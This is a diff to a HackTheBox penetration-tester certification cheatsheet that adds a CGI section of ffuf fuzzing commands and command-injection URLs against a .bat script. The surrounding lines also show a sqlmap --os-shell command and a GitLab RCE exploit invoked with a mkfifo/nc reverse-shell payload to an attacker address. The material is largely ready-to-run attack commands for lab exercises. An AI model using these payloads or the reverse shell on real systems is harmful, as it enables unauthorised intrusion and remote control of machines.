@@ -78,6 +78,7 @@ HackTheBox Certified Penetration Tester Specialist Cheatsheet
   	- [Splunk](#splunk)
   	- [PRTG](#prtg)
   	- [GITLAB](#gitlab)
+  	- [CGI](#cgi)
 - [Useful Resources](#useful-resources)
 
 
@@ -1957,6 +1958,17 @@ sqlmap -u "http://www.example.com/?id=1" --os-shell
 	--> ./gitlab_userenum.sh --url http://gitlab.inlanefreight.local:8081/ --userlist users.txt	
 --> https://www.exploit-db.com/exploits/49951
 	--> python3 gitlab_13_10_2_rce.py -t http://gitlab.inlanefreight.local:8081 -u mrb3n -p password1 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.15 8443 >/tmp/f '
+```
+### CGI
+```
+--> fuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.cmd
+--> sword0x00@htb[/htb]$ ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.bat
+--> try command injection
+	- http://10.129.204.227:8080/cgi/welcome.bat?&dir
+	- http://10.129.204.227:8080/cgi/welcome.bat?&set
+	- http://10.129.204.227:8080/cgi/welcome.bat?&c:\windows\system32\whoami.exe
+	-http://10.129.204.227:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
+
 ```
 ## Useful Resources
 
